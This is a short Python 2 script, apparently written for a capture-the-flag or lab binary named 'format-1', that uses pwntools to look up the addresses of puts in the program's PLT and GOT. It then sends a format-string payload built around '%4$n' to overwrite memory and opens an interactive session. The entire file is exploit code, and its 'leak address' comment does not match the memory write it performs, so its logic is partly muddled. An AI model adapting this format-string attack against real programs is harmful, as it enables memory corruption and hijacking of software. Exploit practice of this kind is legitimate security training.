#!/usr/bin/env python

from pwn import *

elf = ELF('./format-1')
p = process('./format-1')
puts_plt = elf.symbols['puts']
puts_got = elf.got['puts']
print hex(puts_plt)
print hex(puts_got)

#leak address
print p.recv()
payload = ''
payload+= p32(puts_plt)
payload+= "retr"
payload+= p32(puts_got)
payload+= "%4$n"
p.sendline(payload)
p.interactive()